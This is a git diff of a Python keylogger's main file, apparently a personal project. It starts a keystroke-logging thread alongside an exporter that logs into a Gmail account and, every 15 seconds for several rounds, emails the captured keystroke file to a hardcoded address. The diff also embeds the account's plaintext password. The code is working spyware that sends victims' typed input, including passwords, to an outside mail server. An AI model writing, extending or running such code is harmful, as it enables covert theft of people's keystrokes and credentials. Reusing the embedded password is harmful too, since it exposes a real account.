@@ -1,5 +1,6 @@
 """
-Used for exporting record.txt via email
+Main file that both starts the logger and the export script
+By Connor Jackson (BootSkiing)
 """
 import smtplib
 import datetime
@@ -11,7 +12,7 @@ from email.mime.base import MIMEBase
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
-# To and From email addresses (Same for testing purposes)
+# To and From email addresses (Same address for testing purposes)
 FRM_ADDRESS = "keylogger.0w0@gmail.com"
 TO_ADDRESS = "keylogger.0w0@gmail.com"
 
@@ -22,25 +23,33 @@ FRM_PSWD = "DGisonline13"
 # Path to record.txt
 REC_PATH = "record.txt"
 
-RUNNING = False
+# Counter for how many emails to send
+COUNTER = 5
+# Number of Seconds to pause
+PAUSE_TIME = 15
 
 
 def export():
-    global RUNNING
-    RUNNING = True
+    """
+    Method waits a specified amount of time and then sends an email to a specified email address, with the output
+    file attached. Loops for a specified number of times
+
+    :return:
+    """
     # Counter for export loop. Really only used for testing
-    counter = 5
+    counter = COUNTER
+
     while counter > 0:
 
         # Waiting 30 seconds for more keys to be typed
-        pause.seconds(10)
+        pause.seconds(PAUSE_TIME)
 
         # Set up connection / login to email account
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
         server.login(FRM_ADDRESS, FRM_PSWD)
 
-        # Create the headers for the email
+        # Create the headers and body for the email (Includes date/time)
         msg = MIMEMultipart()
         msg['From'] = FRM_ADDRESS
         msg['To'] = TO_ADDRESS
@@ -64,15 +73,22 @@ def export():
 
         # Decrement counter
         counter -= 1
-
     return
 
 
-if __name__ == '__main__':
-    # Creates threads for both the logger and export functions so they may run simultaneously
+def main():
+    """
+    main funtion for exporter. Starts a logger and exporter as seperate threads so that they can run simultaneously.
+    Exporter will end after specified iterations, but logger is only ended with kill key
+
+    :return:
+    """
     t1 = threading.Thread(target=export)
     t2 = threading.Thread(target=logger.listen)
     t1.start()
     t2.start()
-    t1.join()
-    t2.join()
+
+
+if __name__ == '__main__':
+    # Runs exporter
+    main()
